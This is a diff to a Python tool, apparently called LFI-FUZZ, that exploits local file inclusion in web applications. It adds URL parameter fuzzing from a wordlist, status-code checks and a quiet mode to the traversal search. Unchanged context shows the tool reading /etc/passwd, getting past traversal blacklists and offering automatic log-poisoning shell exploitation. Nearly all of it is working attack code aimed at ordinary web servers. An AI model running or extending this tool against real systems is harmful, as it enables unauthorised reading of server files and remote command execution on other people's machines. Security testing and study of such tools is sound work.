@@ -29,23 +29,26 @@ def validate_url(url):
     except:
         print("[-] - THE URL ENTERED CANNOT BE CONNECTED TO... SORRY... EXITTING")
         sys.exit(1)
+    print()
 
     return url
 
 
-def find_traversal(url, filter_str, page_len, traversal_page):
+def find_traversal(url, filter_str, page_len, traversal_page, quiet=False):
     '''Iterates through different possible traverslas, as well as bypassing blacklists'''
     traversal = ""
     traverse_str = "/.."
     depth = 0
-
-    print("\n[*] - FINDING TRAVERSAL PATH...")
+    if not quiet:
+        print("\n[*] - FINDING TRAVERSAL PATH...")
 
     while True:
-        sys.stdout.write(f"\r[*] - ATTEMPT: {traversal}")
+        if not quiet:
+            sys.stdout.write(f"\r[*] - ATTEMPT: {traversal}")
         r = requests.get(url.replace("LFI", traversal + traversal_page))
-        if check_successful_lfi(r.text, filter_str=filter_str, page_len=page_len):
-            return traversal
+        if r.status_code < 400: 
+            if check_successful_lfi(r.text, filter_str=filter_str, page_len=page_len):
+                return traversal
         
         depth += 1
 
@@ -70,9 +73,28 @@ def find_traversal(url, filter_str, page_len, traversal_page):
 
         traversal = traverse_str * depth
 
+def fuzz_params(url, traversal_file):
+    param_fuzz_list = []
+    valid_params = []
+    
+    with open("lfi-fuzz-params-list.txt", "r") as f:
+            param_fuzz_list = f.read().split("\n")
+    
+    print("[*] - FUZZING URL PARAMETERS...")
+    
+    for param in param_fuzz_list:
+        sys.stdout.flush()
+        sys.stdout.write(f"\r[*] - Trying {param}           ")
+        resp = requests.get(url.replace("PARAM", param).replace("LFI", traversal_file))
+        if resp.status_code < 400 or  resp.status_code > 499:
+            print(f"\n[+] - FOUND VALID PARAM : {param}")  
+            valid_params.append(param)
+    return valid_params
+                  
 
 def check_successful_lfi(resp_text, filter_str="", page_len=0):
     '''checks if the lfi has been successful based on the default, no parameter passed page length, and filter string if it is set'''
+    
     if filter_str:
         if filter_str not in resp_text and len(resp_text) != page_len:
             return True
@@ -217,12 +239,20 @@ def log_poison_shell(url, path, command, depth=0):
 def main():
     # Setting up the arg parser
     arg_parser = optparse.OptionParser()
+    
     arg_parser.add_option("-u", "--url", dest="url", help="The URL you wish to test: http://www.example.com/index.php?page=LFI")
+    
     arg_parser.add_option("--traversal-file", dest="traversal_file", help="Specify your own file to search for with LFI - by default this is /etc/passwd, but some php filters will add a file extension")
+    
     arg_parser.add_option("--filter", dest="filter_str", help="An error string that appears commonly on the page when you try to load in an invalid file: 'ERROR - cannot find'. NOTE - this is case sensitive")
+    
     arg_parser.add_option("--custom-file-list", dest="custom_list", help="Specify your own list of files to attempt to find through the LFI")
+    
     arg_parser.add_option("--read-file", dest="file_to_read", help="Specify your own file to attempt to read through the LFI - must specify absolute path: passwd is not enough to get the /etc/passwd")
+    
     arg_parser.add_option("--log-poison", dest="log_poison_option", help="Providing this parameter tells LFI-FUZZ to exploit log poisoning for you if it can...: --log-poison=1 (0 by default, and wont auto exploit by default)")
+    
+    arg_parser.add_option("--param-fuzz", dest="param_fuzz", help="Providing this parameter with a value of 1 tells LFI-FUZZ to try and find parameters with LFI vulnerabilities - --param-fuzz=1")
 
     (options, args) = arg_parser.parse_args()
 
@@ -259,6 +289,27 @@ def main():
     if options.log_poison_option == "1":
     	log_poison_option = True
 
+
+    param_fuzz = False
+    param_fuzz_list = []
+    valid_params = []
+    if options.param_fuzz == "1":
+        if "?PARAM=" not in url:
+            print("[-] - URL MUST HAVE '?PARAM=' IN TO BE ABLE TO FUZZ PARAM")
+            sys.exit(1)
+        param_fuzz = True
+    
+    if param_fuzz:
+        valid_params = fuzz_params(url, traversal_file)
+        if not valid_params:
+            print("\n\n[-] - NO VALID PARAMETERS FOUND... EXITTING")
+            sys.exit(1)
+        else:
+            print("\n\n[+] - VALID PARAMS FOUND: TEST THE FOLLOWING URLS WITHOUT THE --param-fuzz=1 FLAG SET:")
+            [print(url.replace("PARAM", p)) for p in valid_params]
+            sys.exit(1)
+
+
     #attempting to read source code of the current page so we can discover any filters or blacklists in place
     page = "/".join(url.split("/")[3:]).split("?")[0]
     page_data = read_page(url, page)
@@ -266,7 +317,11 @@ def main():
         print(page_data)
 
     # get the default page length with an empty parameter to be able to filter out this length
-    page_len = len(requests.get(url.replace("LFI", "")).text) 
+    req = requests.get(url.replace("LFI", ""))
+    if req.status_code > 400:
+        req = requests.get(url.replace("LFI", "testdata"))
+    page_len = len(req.text) 
+    
     traversal = find_traversal(url, filter_str, page_len, traversal_file)
 
     if traversal == None:
